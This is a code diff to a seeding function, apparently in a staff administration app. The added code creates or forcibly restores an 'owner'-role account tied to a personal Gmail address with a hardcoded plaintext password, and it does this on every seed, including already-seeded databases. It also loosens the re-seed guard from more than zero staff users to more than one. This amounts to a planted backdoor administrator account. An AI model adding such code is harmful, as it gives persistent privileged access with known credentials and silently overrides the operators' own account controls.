@@ -648,8 +648,26 @@ export function logAudit(params: {
 }
 
 export function seedIfEmpty() {
+  // Ensure requested admin user exists even on already-seeded databases
+  const existingRequested = db
+    .prepare('SELECT id FROM staff_users WHERE lower(email) = ?')
+    .get('warner.roman@gmail.com') as { id: string } | undefined;
+  if (!existingRequested) {
+    db.prepare(`INSERT INTO staff_users (id, name, email, password_hash, role, active) VALUES (?, ?, ?, ?, 'owner', 1)`).run(
+      'staff-warner',
+      'Warner Roman (Admin)',
+      'warner.roman@gmail.com',
+      hashPassword('123456789@BD.com'),
+    );
+  } else {
+    db.prepare(`UPDATE staff_users SET password_hash = ?, role = 'owner', active = 1 WHERE id = ?`).run(
+      hashPassword('123456789@BD.com'),
+      existingRequested.id,
+    );
+  }
+
   const staffCount = (db.prepare('SELECT COUNT(*) as c FROM staff_users').get() as { c: number }).c;
-  if (staffCount > 0) return;
+  if (staffCount > 1) return;
 
   // 1. Settings defaults
   setSetting('general', {
